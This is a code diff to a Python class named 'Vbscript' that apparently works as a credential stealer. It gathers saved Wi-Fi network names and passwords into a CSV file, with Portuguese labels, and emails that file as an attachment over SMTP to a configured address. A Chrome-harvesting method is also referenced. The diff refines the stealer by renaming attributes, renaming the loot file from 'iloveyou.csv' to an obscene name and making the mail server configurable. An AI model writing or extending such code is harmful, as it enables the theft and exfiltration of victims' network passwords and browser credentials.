@@ -17,11 +17,11 @@ class Vbscript:
         server:str='smtp.gmail.com', 
         port:int=587) -> None:
         
-        self.email_from = from_email
-        self.password = from_password
-        self.email_to = to_email
-        self.server = server
-        self.port = port
+        self._email_from = from_email
+        self._password = from_password
+        self._email_to = to_email
+        self._server = server
+        self._port = port
     
     # chrome
     def getChrome(self, chrome):
@@ -73,7 +73,7 @@ class Vbscript:
                             two_point2 = network.find(':')
                             passwd = passwords[two_point2+2:]
                             get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
-                            with open('iloveyou.csv', 'a') as wifi:
+                            with open('fuckyou.csv', 'a') as wifi:
                                 wifi.write(f'{get_network}')
                             wifi.close()
         except: ...
@@ -82,15 +82,15 @@ class Vbscript:
     def Send_Email(self):
         msg = MIMEMultipart()
         msg['Subject'] = subject_text
-        msg['From'] = self.email_from
-        msg['To'] = self.email_to
+        msg['From'] = self._email_from
+        msg['To'] = self._email_to
         try:
-            files = open('iloveyou.csv', 'rb')
+            files = open('fuckyou.csv', 'rb')
             att = MIMEBase('application', 'octet-stream')
             att.set_payload(files.read())
             encoders.encode_base64(att)
             att.add_header(
-                'Content-Disposition', 'attachment; filename=iloveyou.csv'
+                'Content-Disposition', 'attachment; filename=fuckyou.csv'
             )
             files.close()
             msg.attach(att)
@@ -99,12 +99,11 @@ class Vbscript:
             return error
         
         context = ssl.create_default_context()
-        with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
+        with smtplib.SMTP(self._server, port=self._port) as smtp:
             try:
                 smtp.starttls(context=context)
-                smtp.login(self.email_from, self.password)
+                smtp.login(self._email_from, self._password)
                 smtp.sendmail(msg['From'], msg['To'], msg.as_string())
-                return 'Email Enviado'
             except Exception as errs:
                 return errs
             
